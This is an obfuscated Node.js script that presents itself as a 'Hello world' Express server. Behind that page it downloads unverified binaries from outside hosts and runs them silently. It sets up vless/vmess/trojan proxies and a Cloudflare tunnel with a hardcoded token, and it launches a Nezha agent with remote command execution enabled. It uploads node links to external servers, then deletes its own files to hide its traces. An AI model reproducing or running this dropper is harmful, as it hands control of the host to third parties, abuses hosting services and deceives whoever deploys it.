const _0x21a5f3=_0x172a;(function(_0x301844,_0x20de83){const _0x169f0b=_0x172a,_0xe7892f=_0x301844();while(!![]){try{const _0x2406d4=-parseInt(_0x169f0b(0xfd))/0x1+parseInt(_0x169f0b(0xb1))/0x2*(parseInt(_0x169f0b(0xf1))/0x3)+-parseInt(_0x169f0b(0x16a))/0x4*(-parseInt(_0x169f0b(0x111))/0x5)+-parseInt(_0x169f0b(0x147))/0x6*(-parseInt(_0x169f0b(0x109))/0x7)+-parseInt(_0x169f0b(0x108))/0x8*(-parseInt(_0x169f0b(0xf9))/0x9)+-parseInt(_0x169f0b(0xc8))/0xa+parseInt(_0x169f0b(0x100))/0xb;if(_0x2406d4===_0x20de83)break;else _0xe7892f['push'](_0xe7892f['shift']());}catch(_0x21a626){_0xe7892f['push'](_0xe7892f['shift']());}}}(_0x5739,0x19a50));const express=require('express'),app=express(),axios=require(_0x21a5f3(0x14b)),os=require('os'),fs=require('fs'),path=require(_0x21a5f3(0xfe)),{promisify}=require(_0x21a5f3(0x11a)),exec=promisify(require(_0x21a5f3(0xef))[_0x21a5f3(0x156)]),{execSync}=require(_0x21a5f3(0xef)),UPLOAD_URL=process[_0x21a5f3(0xd6)][_0x21a5f3(0x135)]||'',PROJECT_URL=process[_0x21a5f3(0xd6)]['PROJECT_URL']||'',AUTO_ACCESS=process['env'][_0x21a5f3(0x10e)]||![],FILE_PATH=process['env']['FILE_PATH']||_0x21a5f3(0xc1),SUB_PATH=process[_0x21a5f3(0xd6)]['SUB_PATH']||'123',PORT=process[_0x21a5f3(0xd6)][_0x21a5f3(0xf7)]||process[_0x21a5f3(0xd6)][_0x21a5f3(0x16b)]||0xbb8,UUID=process[_0x21a5f3(0xd6)]['UUID']||_0x21a5f3(0x132),NEZHA_SERVER=process[_0x21a5f3(0xd6)]['NEZHA_SERVER']||'',NEZHA_PORT=process['env'][_0x21a5f3(0x136)]||'',NEZHA_KEY=process[_0x21a5f3(0xd6)][_0x21a5f3(0xc4)]||'',ARGO_DOMAIN=process[_0x21a5f3(0xd6)][_0x21a5f3(0x128)]||_0x21a5f3(0x106),ARGO_AUTH=process[_0x21a5f3(0xd6)]['ARGO_AUTH']||_0x21a5f3(0x15f),ARGO_PORT=process[_0x21a5f3(0xd6)][_0x21a5f3(0x149)]||0x1f41,CFIP=process[_0x21a5f3(0xd6)][_0x21a5f3(0x117)]||'cdns.doon.eu.org',CFPORT=process[_0x21a5f3(0xd6)][_0x21a5f3(0xe2)]||0x1bb,NAME=process[_0x21a5f3(0xd6)][_0x21a5f3(0x164)]||'';!fs[_0x21a5f3(0xaf)](FILE_PATH)?(fs[_0x21a5f3(0x152)](FILE_PATH),console[_0x21a5f3(0x158)](FILE_PATH+_0x21a5f3(0xfa))):console['log'](FILE_PATH+_0x21a5f3(0xe8));function generateRandomName(){const _0x2e6f27=_0x21a5f3,_0x23321b='abcdefghijklmnopqrstuvwxyz';let _0x54fad8='';for(let _0x5b1bd2=0x0;_0x5b1bd2<0x6;_0x5b1bd2++){_0x54fad8+=_0x23321b[_0x2e6f27(0xe4)](Math[_0x2e6f27(0xc6)](Math[_0x2e6f27(0x134)]()*_0x23321b[_0x2e6f27(0xe7)]));}return _0x54fad8;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x21a5f3(0xc7)](FILE_PATH,npmName),phpPath=path[_0x21a5f3(0xc7)](FILE_PATH,phpName),webPath=path[_0x21a5f3(0xc7)](FILE_PATH,webName),botPath=path[_0x21a5f3(0xc7)](FILE_PATH,botName),subPath=path[_0x21a5f3(0xc7)](FILE_PATH,_0x21a5f3(0xba)),listPath=path[_0x21a5f3(0xc7)](FILE_PATH,_0x21a5f3(0xbd)),bootLogPath=path[_0x21a5f3(0xc7)](FILE_PATH,_0x21a5f3(0x120)),configPath=path['join'](FILE_PATH,_0x21a5f3(0xfb));function deleteNodes(){const _0x5936a8=_0x21a5f3;try{if(!UPLOAD_URL)return;if(!fs[_0x5936a8(0xaf)](subPath))return;let _0x2859d7;try{_0x2859d7=fs[_0x5936a8(0x165)](subPath,_0x5936a8(0xf6));}catch{return null;}const _0x5996f1=Buffer['from'](_0x2859d7,_0x5936a8(0xb5))['toString']('utf-8'),_0x274f6c=_0x5996f1['split']('\x0a')[_0x5936a8(0xd1)](_0x2decfe=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x5936a8(0xdd)](_0x2decfe));if(_0x274f6c['length']===0x0)return;return axios[_0x5936a8(0xb7)](UPLOAD_URL+'/api/delete-nodes',JSON['stringify']({'nodes':_0x274f6c}),{'headers':{'Content-Type':'application/json'}})[_0x5936a8(0x14a)](_0x10c782=>{return null;}),null;}catch(_0x16cc38){return null;}}function cleanupOldFiles(){const _0x629a7a=_0x21a5f3;try{const _0x1622a0=fs[_0x629a7a(0x121)](FILE_PATH);_0x1622a0[_0x629a7a(0xae)](_0x27bcd9=>{const _0x449169=_0x629a7a,_0x1ee847=path[_0x449169(0xc7)](FILE_PATH,_0x27bcd9);try{const _0x1f0921=fs[_0x449169(0x124)](_0x1ee847);_0x1f0921['isFile']()&&fs['unlinkSync'](_0x1ee847);}catch(_0x8fb763){}});}catch(_0x552cc0){}}app[_0x21a5f3(0x140)]('/',function(_0x50887d,_0x5d4c7b){const _0x3f5636=_0x21a5f3;_0x5d4c7b[_0x3f5636(0xf5)]('Hello\x20world!');});async function generateConfig(){const _0x2412ff=_0x21a5f3,_0x5b0118={'log':{'access':'/dev/null','error':_0x2412ff(0xf0),'loglevel':_0x2412ff(0x13f)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x2412ff(0xeb),'settings':{'clients':[{'id':UUID,'flow':_0x2412ff(0xbc)}],'decryption':_0x2412ff(0x13f),'fallbacks':[{'dest':0xbb9},{'path':_0x2412ff(0x113),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x2412ff(0xe3),'dest':0xbbc}]},'streamSettings':{'network':_0x2412ff(0x110)}},{'port':0xbb9,'listen':_0x2412ff(0xd3),'protocol':_0x2412ff(0xeb),'settings':{'clients':[{'id':UUID}],'decryption':_0x2412ff(0x13f)},'streamSettings':{'network':'tcp','security':_0x2412ff(0x13f)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x2412ff(0xeb),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x2412ff(0x13f)},'streamSettings':{'network':'ws','security':_0x2412ff(0x13f),'wsSettings':{'path':_0x2412ff(0x113)}},'sniffing':{'enabled':!![],'destOverride':[_0x2412ff(0xde),_0x2412ff(0xbb),_0x2412ff(0xcf)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x2412ff(0xd3),'protocol':_0x2412ff(0xd8),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x2412ff(0x168)}},'sniffing':{'enabled':!![],'destOverride':[_0x2412ff(0xde),_0x2412ff(0xbb),_0x2412ff(0xcf)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x2412ff(0xd3),'protocol':_0x2412ff(0x139),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x2412ff(0xe3)}},'sniffing':{'enabled':!![],'destOverride':[_0x2412ff(0xde),'tls',_0x2412ff(0xcf)],'metadataOnly':![]}}],'dns':{'servers':[_0x2412ff(0x145)]},'outbounds':[{'protocol':_0x2412ff(0x14f),'tag':_0x2412ff(0x103)},{'protocol':_0x2412ff(0x13a),'tag':_0x2412ff(0xff)}]};fs[_0x2412ff(0x13e)](path[_0x2412ff(0xc7)](FILE_PATH,_0x2412ff(0xfb)),JSON[_0x2412ff(0x119)](_0x5b0118,null,0x2));}function getSystemArchitecture(){const _0x22eb3d=_0x21a5f3,_0xdd1a04=os[_0x22eb3d(0x12b)]();return _0xdd1a04===_0x22eb3d(0xe5)||_0xdd1a04===_0x22eb3d(0x16d)||_0xdd1a04===_0x22eb3d(0xf4)?'arm':_0x22eb3d(0x12c);}function _0x172a(_0x5f19fe,_0x280369){const _0x57391f=_0x5739();return _0x172a=function(_0x172abb,_0x3fb775){_0x172abb=_0x172abb-0xad;let _0x5accb8=_0x57391f[_0x172abb];return _0x5accb8;},_0x172a(_0x5f19fe,_0x280369);}function downloadFile(_0x55a6f8,_0x1b76cc,_0x2e3405){const _0x5a7168=_0x21a5f3,_0x11ba31=_0x55a6f8;!fs[_0x5a7168(0xaf)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x34beb7=fs[_0x5a7168(0x10f)](_0x11ba31);axios({'method':'get','url':_0x1b76cc,'responseType':'stream'})[_0x5a7168(0xbf)](_0x8e6109=>{const _0x53b34b=_0x5a7168;_0x8e6109[_0x53b34b(0xcd)]['pipe'](_0x34beb7),_0x34beb7['on'](_0x53b34b(0x116),()=>{const _0x4e2f6a=_0x53b34b;_0x34beb7[_0x4e2f6a(0xc5)](),console[_0x4e2f6a(0x158)]('Download\x20'+path[_0x4e2f6a(0xe6)](_0x11ba31)+'\x20successfully'),_0x2e3405(null,_0x11ba31);}),_0x34beb7['on'](_0x53b34b(0xe0),_0x111acb=>{const _0x45a7fc=_0x53b34b;fs[_0x45a7fc(0x151)](_0x11ba31,()=>{});const _0x48e5c4=_0x45a7fc(0xd2)+path[_0x45a7fc(0xe6)](_0x11ba31)+_0x45a7fc(0x166)+_0x111acb['message'];console[_0x45a7fc(0xe0)](_0x48e5c4),_0x2e3405(_0x48e5c4);});})[_0x5a7168(0x14a)](_0x2f72c3=>{const _0x6a567c=_0x5a7168,_0x121b3e=_0x6a567c(0xd2)+path['basename'](_0x11ba31)+_0x6a567c(0x166)+_0x2f72c3[_0x6a567c(0x122)];console[_0x6a567c(0xe0)](_0x121b3e),_0x2e3405(_0x121b3e);});}async function downloadFilesAndRun(){const _0x343e1a=_0x21a5f3,_0x18264b=getSystemArchitecture(),_0x95e197=getFilesForArchitecture(_0x18264b);if(_0x95e197[_0x343e1a(0xe7)]===0x0){console['log'](_0x343e1a(0x142));return;}const _0x341bcb=_0x95e197['map'](_0x23947b=>{return new Promise((_0x3ddfc7,_0x3705f7)=>{const _0x56348a=_0x172a;downloadFile(_0x23947b['fileName'],_0x23947b[_0x56348a(0x115)],(_0x4581b7,_0x311688)=>{_0x4581b7?_0x3705f7(_0x4581b7):_0x3ddfc7(_0x311688);});});});try{await Promise[_0x343e1a(0x10b)](_0x341bcb);}catch(_0x256be5){console[_0x343e1a(0xe0)](_0x343e1a(0xe9),_0x256be5);return;}function _0x1eb91e(_0x1504ab){const _0x434c5b=_0x343e1a,_0x538e55=0x1fd;_0x1504ab[_0x434c5b(0xae)](_0x471cdd=>{const _0x12e455=_0x434c5b;fs[_0x12e455(0xaf)](_0x471cdd)&&fs[_0x12e455(0xf2)](_0x471cdd,_0x538e55,_0x1da534=>{const _0x3df7c5=_0x12e455;_0x1da534?console[_0x3df7c5(0xe0)]('Empowerment\x20failed\x20for\x20'+_0x471cdd+':\x20'+_0x1da534):console[_0x3df7c5(0x158)](_0x3df7c5(0x163)+_0x471cdd+':\x20'+_0x538e55['toString'](0x8));});});}const _0x169e62=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x1eb91e(_0x169e62);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x392555=NEZHA_SERVER[_0x343e1a(0x107)](':')?NEZHA_SERVER[_0x343e1a(0x123)](':')[_0x343e1a(0x15e)]():'',_0x100116=new Set([_0x343e1a(0x101),_0x343e1a(0xb0),_0x343e1a(0x15b),'2087',_0x343e1a(0xd9),_0x343e1a(0x11e)]),_0x5b860a=_0x100116[_0x343e1a(0x153)](_0x392555)?_0x343e1a(0xb8):_0x343e1a(0xdb),_0x5371b4='\x0aclient_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x343e1a(0xcb)+_0x5b860a+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x343e1a(0x13e)](path[_0x343e1a(0xc7)](FILE_PATH,_0x343e1a(0x14e)),_0x5371b4);const _0x462be5=_0x343e1a(0xdc)+phpPath+_0x343e1a(0xee)+FILE_PATH+_0x343e1a(0x10c);try{await exec(_0x462be5),console[_0x343e1a(0x158)](phpName+'\x20is\x20running'),await new Promise(_0x55b6f3=>setTimeout(_0x55b6f3,0x3e8));}catch(_0xca0db9){console[_0x343e1a(0xe0)](_0x343e1a(0x12e)+_0xca0db9);}}else{let _0xe356c7='';const _0x32564e=[_0x343e1a(0x101),_0x343e1a(0xb0),_0x343e1a(0x15b),_0x343e1a(0x104),_0x343e1a(0xd9),'2053'];_0x32564e[_0x343e1a(0x107)](NEZHA_PORT)&&(_0xe356c7=_0x343e1a(0xbe));const _0x51c075=_0x343e1a(0xdc)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x343e1a(0x160)+NEZHA_KEY+'\x20'+_0xe356c7+_0x343e1a(0xb4);try{await exec(_0x51c075),console['log'](npmName+'\x20is\x20running'),await new Promise(_0x48573d=>setTimeout(_0x48573d,0x3e8));}catch(_0x2fa2f2){console[_0x343e1a(0xe0)]('npm\x20running\x20error:\x20'+_0x2fa2f2);}}}else console[_0x343e1a(0x158)](_0x343e1a(0xca));const _0x33659a=_0x343e1a(0xdc)+webPath+_0x343e1a(0x141)+FILE_PATH+_0x343e1a(0xc2);try{await exec(_0x33659a),console['log'](webName+_0x343e1a(0x15d)),await new Promise(_0x911898=>setTimeout(_0x911898,0x3e8));}catch(_0x2bb555){console[_0x343e1a(0xe0)](_0x343e1a(0xec)+_0x2bb555);}if(fs[_0x343e1a(0xaf)](botPath)){let _0x24dec3;if(ARGO_AUTH[_0x343e1a(0x125)](/^[A-Z0-9a-z=]{120,250}$/))_0x24dec3=_0x343e1a(0x169)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x24dec3=_0x343e1a(0x11f)+FILE_PATH+'/tunnel.yml\x20run':_0x24dec3=_0x343e1a(0x12a)+FILE_PATH+_0x343e1a(0xed)+ARGO_PORT;try{await exec(_0x343e1a(0xdc)+botPath+'\x20'+_0x24dec3+_0x343e1a(0x154)),console[_0x343e1a(0x158)](botName+'\x20is\x20running'),await new Promise(_0x2c0e39=>setTimeout(_0x2c0e39,0x7d0));}catch(_0x4ea625){console[_0x343e1a(0xe0)]('Error\x20executing\x20command:\x20'+_0x4ea625);}}await new Promise(_0x5b9b9e=>setTimeout(_0x5b9b9e,0x1388));}function getFilesForArchitecture(_0x2de64b){const _0x117b60=_0x21a5f3;let _0x35d907;_0x2de64b===_0x117b60(0xe5)?_0x35d907=[{'fileName':webPath,'fileUrl':_0x117b60(0x14d)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x35d907=[{'fileName':webPath,'fileUrl':_0x117b60(0x114)},{'fileName':botPath,'fileUrl':_0x117b60(0x159)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x5c72ac=_0x2de64b===_0x117b60(0xe5)?'https://arm64.ssss.nyc.mn/agent':_0x117b60(0x148);_0x35d907[_0x117b60(0xb3)]({'fileName':npmPath,'fileUrl':_0x5c72ac});}else{const _0x3be0d1=_0x2de64b===_0x117b60(0xe5)?'https://arm64.ssss.nyc.mn/v1':'https://amd64.ssss.nyc.mn/v1';_0x35d907['unshift']({'fileName':phpPath,'fileUrl':_0x3be0d1});}}return _0x35d907;}function argoType(){const _0x34d842=_0x21a5f3;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x34d842(0x158)](_0x34d842(0x146));return;}if(ARGO_AUTH[_0x34d842(0x107)](_0x34d842(0x161))){fs[_0x34d842(0x13e)](path[_0x34d842(0xc7)](FILE_PATH,_0x34d842(0x150)),ARGO_AUTH);const _0x1de658=_0x34d842(0xc9)+ARGO_AUTH[_0x34d842(0x123)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path['join'](FILE_PATH,_0x34d842(0x150))+_0x34d842(0xd5)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x34d842(0x13e)](path[_0x34d842(0xc7)](FILE_PATH,_0x34d842(0x127)),_0x1de658);}else console[_0x34d842(0x158)](_0x34d842(0xd0));}argoType();async function extractDomains(){const _0x3dabc8=_0x21a5f3;let _0x23f9c9;if(ARGO_AUTH&&ARGO_DOMAIN)_0x23f9c9=ARGO_DOMAIN,console['log'](_0x3dabc8(0x112),_0x23f9c9),await _0x2aafdd(_0x23f9c9);else try{const _0x595438=fs[_0x3dabc8(0x165)](path[_0x3dabc8(0xc7)](FILE_PATH,_0x3dabc8(0x120)),_0x3dabc8(0xf6)),_0x4a82cb=_0x595438['split']('\x0a'),_0x1ba7cc=[];_0x4a82cb[_0x3dabc8(0xae)](_0x2145d0=>{const _0xec8754=_0x2145d0['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0xec8754){const _0x612c2a=_0xec8754[0x1];_0x1ba7cc['push'](_0x612c2a);}});if(_0x1ba7cc[_0x3dabc8(0xe7)]>0x0)_0x23f9c9=_0x1ba7cc[0x0],console[_0x3dabc8(0x158)](_0x3dabc8(0xce),_0x23f9c9),await _0x2aafdd(_0x23f9c9);else{console['log'](_0x3dabc8(0x10a)),fs[_0x3dabc8(0x167)](path[_0x3dabc8(0xc7)](FILE_PATH,_0x3dabc8(0x120)));async function _0xcb3b4f(){const _0x46b157=_0x3dabc8;try{process[_0x46b157(0x102)]===_0x46b157(0x15c)?await exec(_0x46b157(0x155)+botName+_0x46b157(0x144)):await exec(_0x46b157(0x13d)+botName['charAt'](0x0)+']'+botName[_0x46b157(0xea)](0x1)+_0x46b157(0x126));}catch(_0x1e7dbf){}}_0xcb3b4f(),await new Promise(_0x471f36=>setTimeout(_0x471f36,0xbb8));const _0x316155=_0x3dabc8(0x12a)+FILE_PATH+_0x3dabc8(0xed)+ARGO_PORT;try{await exec(_0x3dabc8(0xdc)+botPath+'\x20'+_0x316155+_0x3dabc8(0x154)),console[_0x3dabc8(0x158)](botName+_0x3dabc8(0x15d)),await new Promise(_0x5e8420=>setTimeout(_0x5e8420,0xbb8)),await extractDomains();}catch(_0x23cf6c){console[_0x3dabc8(0xe0)](_0x3dabc8(0xb2)+_0x23cf6c);}}}catch(_0x3ab179){console[_0x3dabc8(0xe0)](_0x3dabc8(0x11b),_0x3ab179);}async function _0x2aafdd(_0x4959de){const _0xdda03f=_0x3dabc8,_0x4480e7=execSync('curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27',{'encoding':_0xdda03f(0xf6)}),_0x11b48c=_0x4480e7[_0xdda03f(0x162)](),_0x2611b3=NAME?NAME+'-'+_0x11b48c:_0x11b48c;return new Promise(_0x413968=>{setTimeout(()=>{const _0x3526c2=_0x172a,_0x3bfcc6={'v':'2','ps':''+_0x2611b3,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x3526c2(0x13f),'net':'ws','type':_0x3526c2(0x13f),'host':_0x4959de,'path':'/vmess-argo?ed=2560','tls':_0x3526c2(0xbb),'sni':_0x4959de,'alpn':'','fp':_0x3526c2(0x143)},_0x2a82bc=_0x3526c2(0xfc)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x4959de+'&fp=firefox&type=ws&host='+_0x4959de+_0x3526c2(0x118)+_0x2611b3+_0x3526c2(0x13c)+Buffer[_0x3526c2(0xb9)](JSON[_0x3526c2(0x119)](_0x3bfcc6))['toString']('base64')+_0x3526c2(0x14c)+UUID+'@'+CFIP+':'+CFPORT+_0x3526c2(0x138)+_0x4959de+'&fp=firefox&type=ws&host='+_0x4959de+_0x3526c2(0xd4)+_0x2611b3+'\x0a\x20\x20\x20\x20';console[_0x3526c2(0x158)](Buffer[_0x3526c2(0xb9)](_0x2a82bc)[_0x3526c2(0x12d)](_0x3526c2(0xb5))),fs[_0x3526c2(0x13e)](subPath,Buffer[_0x3526c2(0xb9)](_0x2a82bc)['toString']('base64')),console['log'](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x3526c2(0x140)]('/'+SUB_PATH,(_0x38475f,_0x15a151)=>{const _0x268b2d=_0x3526c2,_0x253c31=Buffer['from'](_0x2a82bc)['toString'](_0x268b2d(0xb5));_0x15a151[_0x268b2d(0xe1)](_0x268b2d(0xcc),'text/plain;\x20charset=utf-8'),_0x15a151[_0x268b2d(0xf5)](_0x253c31);}),_0x413968(_0x2a82bc);},0x7d0);});}}function _0x5739(){const _0x574244=['has','\x20>/dev/null\x202>&1\x20&','taskkill\x20/f\x20/im\x20','exec','/api/add-subscriptions','log','https://amd64.ssss.nyc.mn/bot','Add\x20automatic\x20access\x20task\x20faild:\x20','2096','win32','\x20is\x20running','pop','eyJhIjoiODcxNDdmYTc0NTRhNGZiZWU2MGQwYmY5OTA1MTQ1NDMiLCJ0IjoiYjE3MDlmM2ItYzU1Yi00MDU0LTlkNjEtOGQxZWQ0Yzc4OGQ5IiwicyI6Ik9ERTBZelZqTnpRdFkyUXhOQzAwWWpabExXSmlaVGt0TVRjMVlUVmxOekZrT0RnMyJ9','\x20-p\x20','TunnelSecret','trim','Empowerment\x20success\x20for\x20','NAME','readFileSync','\x20failed:\x20','unlinkSync','/vmess-argo','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','28jQbmNi','PORT','rm\x20-rf\x20','arm64','\x20>\x20nul\x202>&1','forEach','existsSync','8443','6176zdjWKx','Error\x20executing\x20command:\x20','unshift','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','base64','https://oooo.serv00.net/add-url','post','true','from','sub.txt','tls','xtls-rprx-vision','list.txt','--tls','then','application/json','./tmp','/config.json\x20>/dev/null\x202>&1\x20&','push','NEZHA_KEY','close','floor','join','1163420zfTJDE','\x0a\x20\x20tunnel:\x20','NEZHA\x20variable\x20is\x20empty,skip\x20running','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','Content-Type','data','ArgoDomain:','quic','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','filter','Download\x20','127.0.0.1','&path=%2Ftrojan-argo%3Fed%3D2560#','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','env','Error\x20in\x20startserver:','vmess','2083','response','false','nohup\x20','test','http','\x20>/dev/null\x202>&1','error','set','CFPORT','/trojan-argo','charAt','arm','basename','length','\x20already\x20exists','Error\x20downloading\x20files:','substring','vless','web\x20running\x20error:\x20','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','\x20-c\x20\x22','child_process','/dev/null','6MCbZnX','chmod','Skipping\x20adding\x20automatic\x20access\x20task','aarch64','send','utf-8','SERVER_PORT','Unhandled\x20error\x20in\x20startserver:','9TCdRQj','\x20is\x20created','config.json','\x0avless://','120182FfSOYX','path','block','1792791zoBRlO','443','platform','direct','2087','automatic\x20access\x20task\x20added\x20successfully','ping194.askz.pp.ua','includes','167768fSnXES','7JMiciB','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','all','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','clear','AUTO_ACCESS','createWriteStream','tcp','85585jIkcJm','ARGO_DOMAIN:','/vless-argo','https://amd64.ssss.nyc.mn/web','fileUrl','finish','CFIP','&path=%2Fvless-argo%3Fed%3D2560#','stringify','util','Error\x20reading\x20boot.log:','http\x20server\x20is\x20running\x20on\x20port:','App\x20is\x20running','2053','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','boot.log','readdirSync','message','split','statSync','match','\x22\x20>\x20/dev/null\x202>&1','tunnel.yml','ARGO_DOMAIN','status','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','arch','amd','toString','php\x20running\x20error:\x20','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','listen','/api/add-nodes','bfd00593-ac59-476e-9e6e-13254db4ab97','del\x20/f\x20/q\x20','random','UPLOAD_URL','NEZHA_PORT','Subscription\x20uploaded\x20successfully','?security=tls&sni=','trojan','blackhole','Nodes\x20uploaded\x20successfully','\x0a\x20\x20\x0avmess://','pkill\x20-f\x20\x22[','writeFileSync','none','get','\x20-c\x20','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','firefox','.exe\x20>\x20nul\x202>&1','https+local://8.8.8.8/dns-query','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','189702AvcOnI','https://amd64.ssss.nyc.mn/agent','ARGO_PORT','catch','axios','\x0a\x20\x20\x0atrojan://','https://arm64.ssss.nyc.mn/web','config.yaml','freedom','tunnel.json','unlink','mkdirSync'];_0x5739=function(){return _0x574244;};return _0x5739();}async function uploadNodes(){const _0x39f66d=_0x21a5f3;if(UPLOAD_URL&&PROJECT_URL){const _0x28f262=PROJECT_URL+'/'+SUB_PATH,_0x2bba0e={'subscription':[_0x28f262]};try{const _0x2861a0=await axios[_0x39f66d(0xb7)](UPLOAD_URL+_0x39f66d(0x157),_0x2bba0e,{'headers':{'Content-Type':'application/json'}});return _0x2861a0&&_0x2861a0[_0x39f66d(0x129)]===0xc8?(console['log'](_0x39f66d(0x137)),_0x2861a0):null;}catch(_0x8a05e8){if(_0x8a05e8[_0x39f66d(0xda)]){if(_0x8a05e8['response'][_0x39f66d(0x129)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x39f66d(0xaf)](listPath))return;const _0x339b8c=fs[_0x39f66d(0x165)](listPath,_0x39f66d(0xf6)),_0x3c5717=_0x339b8c[_0x39f66d(0x123)]('\x0a')[_0x39f66d(0xd1)](_0x3688c5=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x39f66d(0xdd)](_0x3688c5));if(_0x3c5717['length']===0x0)return;const _0x2c2f34=JSON[_0x39f66d(0x119)]({'nodes':_0x3c5717});try{const _0x3c7915=await axios[_0x39f66d(0xb7)](UPLOAD_URL+_0x39f66d(0x131),_0x2c2f34,{'headers':{'Content-Type':_0x39f66d(0xc0)}});return _0x3c7915&&_0x3c7915[_0x39f66d(0x129)]===0xc8?(console[_0x39f66d(0x158)](_0x39f66d(0x13b)),_0x3c7915):null;}catch(_0x45fa90){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x41a753=_0x172a,_0x2786aa=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x2786aa[_0x41a753(0xc3)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x2786aa[_0x41a753(0xc3)](phpPath);process[_0x41a753(0x102)]===_0x41a753(0x15c)?exec(_0x41a753(0x133)+_0x2786aa[_0x41a753(0xc7)]('\x20')+_0x41a753(0xad),_0x5eae2a=>{const _0xd42f31=_0x41a753;console[_0xd42f31(0x10d)](),console[_0xd42f31(0x158)]('App\x20is\x20running'),console[_0xd42f31(0x158)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x41a753(0x16c)+_0x2786aa['join']('\x20')+_0x41a753(0xdf),_0x4c92e4=>{const _0x534db3=_0x41a753;console[_0x534db3(0x10d)](),console['log'](_0x534db3(0x11d)),console[_0x534db3(0x158)](_0x534db3(0x12f));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x53a23a=_0x21a5f3;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x53a23a(0x158)](_0x53a23a(0xf3));return;}try{const _0x4a78d6=await axios[_0x53a23a(0xb7)](_0x53a23a(0xb6),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x53a23a(0xc0)}});return console[_0x53a23a(0x158)](_0x53a23a(0x105)),_0x4a78d6;}catch(_0x5b8cf0){return console[_0x53a23a(0xe0)](_0x53a23a(0x15a)+_0x5b8cf0[_0x53a23a(0x122)]),null;}}async function startserver(){const _0x394684=_0x21a5f3;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x1ad702){console['error'](_0x394684(0xd7),_0x1ad702);}}startserver()['catch'](_0x53c6de=>{const _0x2932e1=_0x21a5f3;console[_0x2932e1(0xe0)](_0x2932e1(0xf8),_0x53c6de);}),app[_0x21a5f3(0x130)](PORT,()=>console[_0x21a5f3(0x158)](_0x21a5f3(0x11c)+PORT+'!'));
